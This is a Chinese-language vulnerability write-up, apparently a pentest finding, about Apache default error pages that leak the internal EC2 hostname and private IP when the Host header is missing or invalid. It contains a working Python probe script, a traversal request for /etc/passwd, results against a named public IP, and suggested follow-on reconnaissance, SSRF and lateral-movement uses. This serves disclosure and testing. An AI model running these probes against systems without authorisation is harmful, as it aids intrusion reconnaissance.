# Apache 默认错误页（缺/非法 Host）泄露 ServerName 内网主机名 + 私网 IP

## 原理

Apache httpd 默认错误页正文末尾有固定一行：

```
<address>Apache/2.4.29 (Ubuntu) Server at <host> Port <port></address>
```

`<host>` 的来源：
- 正常请求 → 回显客户端 `Host` 头（或 `UseCanonicalName Off` 时的连接地址）；
- 请求**没有 Host**（HTTP/1.0 不带头）或 **Host 非法/缺失**（HTTP/1.1 缺 Host、畸形 URI 触发 400、超长 URI 触发 414）时，
  httpd 回落到 `UseCanonicalName On`（默认）下的 `ServerName`。未显式配置 ServerName 时由启动时反查本机名得到，
  在 AWS 上即 `ip-<a>-<b>-<c>-<d>.<region>.compute.internal` 形式的私有 DNS 名，直接把私网 IP 编码在内。

## 前置条件

1. 能直连目标 `IP:PORT`（本例 8080 上的默认站点）。
   **不能走 CDN / 前置 nginx / 平台记录代理**：它们会补 Host、改写请求或返回自己的错误页。
   - curl：加 `--noproxy '*'`；
   - Python 原始 socket：天然直连。
2. 目标保持默认错误页：未设 `ServerTokens Prod`（否则 address 行无版本串，但主机名通常仍在）、
   未用 `ErrorDocument` 覆盖、`UseCanonicalName` 为 On（默认）。
3. 无任何认证/凭据要求。

## 复现脚本（Python3 原始 socket，最稳）

```python
#!/usr/bin/env python3
# 用法: python3 apache_errpage_hostname_leak.py <ip> <port>
# 判据: 任一响应体 <address> 行的 host 部分 != 请求的 IP/Host 即命中
import socket, sys

IP, PORT = sys.argv[1], int(sys.argv[2]) if len(sys.argv) > 2 else 80

PROBES = [
    ("404 no-Host (HTTP/1.0)", b"GET /zz-nonexist-probe HTTP/1.0\r\n\r\n"),
    ("400 traversal  (HTTP/1.0)", b"GET /%2e%2e/%2e%2e/etc/passwd HTTP/1.0\r\n\r\n"),
    ("400 no-Host    (HTTP/1.1)", b"GET / HTTP/1.1\r\n\r\n"),
    ("414 long-URI   (HTTP/1.0)", b"GET /" + b"A" * 9000 + b" HTTP/1.0\r\n\r\n"),
    ("baseline with Host",        ("GET / HTTP/1.0\r\nHost: %s\r\n\r\n" % IP).encode()),
]

for label, payload in PROBES:
    s = socket.socket(); s.settimeout(8)
    try:
        s.connect((IP, PORT)); s.sendall(payload)
        data = b""
        while len(data) < 65536:
            c = s.recv(4096)
            if not c: break
            data += c
        head, _, body = data.partition(b"\r\n\r\n")
        status = head.split(b"\r\n")[0].decode("latin1", "replace")
        addr = [l.strip() for l in body.decode("latin1", "replace").splitlines() if "<address>" in l]
        print(f"[{label}] {status} | {addr[0] if addr else '(no address line)'}")
    except Exception as e:
        print(f"[{label}] ERROR {type(e).__name__}: {e}")
    finally:
        s.close()
```

一行版：

```bash
curl -s --http1.0 --noproxy '*' "http://<IP>:<PORT>/zz-nonexist-$RANDOM" | grep -i '<address>'
```

## 实测回显（2026-11-11，107.21.85.212:8080）

| 请求 | status | address 行 host |
|---|---|---|
| `GET /zz-nonexistent-hostexpose HTTP/1.0`（无 Host） | 404 | `ip-172-30-0-219.ec2.internal` |
| `GET /%2e%2e/%2e%2e/etc/passwd HTTP/1.0` | 400 | 同上 |
| `GET / HTTP/1.1`（缺 Host） | 400 | 同上 |
| `GET /<9000×A> HTTP/1.0` | 414 | 同上 |
| `GET / HTTP/1.0` + `Host: 107.21.85.212` | 200 | 无 address 行（阴性对照） |

四类错误页一致 → 非偶发；带合法 Host 即不复现 → 触发条件确认为缺/非法 Host。

> 注：若上游工单把主机名转写成了其他形如 `xxx.internal` 的串，以原始 HTTP 响应为准；本例原文为 `ec2.internal`（AWS EC2 默认私有 DNS）。

## 判据

1. 响应体存在 `<address>... Server at <host> Port <port></address>`；
2. `<host>` 不是本次请求的 IP / Host 头，而是内网命名（如 `ip-172-30-0-219.ec2.internal`）；
3. 至少两种不同错误类型（404 + 400 或 414）返回同一 host，排除单页特例；
4. 阴性对照：带合法 Host 时不出现该行。

## 常见失败原因（按概率排序）

1. **走了代理/CDN/前置反代**：拿到 301/403/统一错误页，根本没有 Apache address 行 —— 必须 `--noproxy '*'` 或 raw socket 直连源站 IP 与真实端口。
2. **用了 HTTP/1.1 且 curl 自动补了 Host**：返回正常页面，无 address 行 —— 用 `--http1.0` 或 `-H 'Host:'` 删头。
3. `ServerTokens Prod` + 自定义 `ErrorDocument`：页脚被整体替换，该行不存在。
4. `UseCanonicalName Off`：address 行显示连接地址（即你打的 IP），不泄露 ServerName。
5. 目标端口是前置 nginx 而非 Apache：nginx 错误页无 address 行，需先换端口/换 vhost 找到真正的 httpd。

## 延伸价值

- `ip-<a>-<b>-<c>-<d>` 直接还原私网 IP（本例 172.30.0.219，落 AWS VPC 172.30.0.0/16）；
- 泄露的 `.ec2.internal`/`.compute.internal` 后缀可确认云厂商与 region 命名；
- 同一 IP 上的其他服务（本例同机为 BI/Redash 类应用）可据此做内网定位、Host 头探测与 SSRF 目标清单；
- 本缺陷本身无直接利用能力，价值在侦察与横向线索，故定级 low。